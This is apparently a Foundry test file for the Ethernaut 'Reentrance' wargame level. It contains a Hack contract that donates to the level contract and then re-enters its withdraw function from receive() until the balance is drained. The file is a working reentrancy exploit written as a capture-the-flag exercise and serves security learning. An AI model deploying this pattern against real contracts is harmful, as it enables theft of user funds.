// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Reentrance/ReentranceFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testReentranceHack() public {
        /****************
         * Factory setup *
         *************** */
        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
            reentranceFactory
        );
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        Hack hack = new Hack(levelAddress);
        hack.hack{value: 1.001 ether}();

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Hack {
    Reentrance public challenge;

    // -- 1 --
    constructor(address challengeAddress) {
        challenge = Reentrance(payable(challengeAddress));
    }

    function hack() external payable {
        // -- 2 --
        challenge.donate{value: msg.value}(address(this));
        challenge.withdraw(0.1 ether);
    }

    fallback() external payable {}

    receive() external payable {
        if (address(challenge).balance > 0) {
            challenge.withdraw(address(challenge).balance > .15 ether ? .15 ether : address(challenge).balance);
        }
    }
}
